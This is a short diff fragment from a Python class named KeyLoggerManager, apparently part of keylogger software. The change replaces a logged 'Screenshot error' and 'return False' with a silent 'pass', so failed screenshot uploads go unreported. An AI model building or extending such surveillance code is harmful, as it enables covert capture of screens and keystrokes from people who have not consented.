@@ -84,5 +84,4 @@ class KeyLoggerManager(IKeyLoggerManager):
             return response.status_code == 200
 
         except Exception as e:
-            print(f"Screenshot error: {str(e)}")
-            return False
+            pass
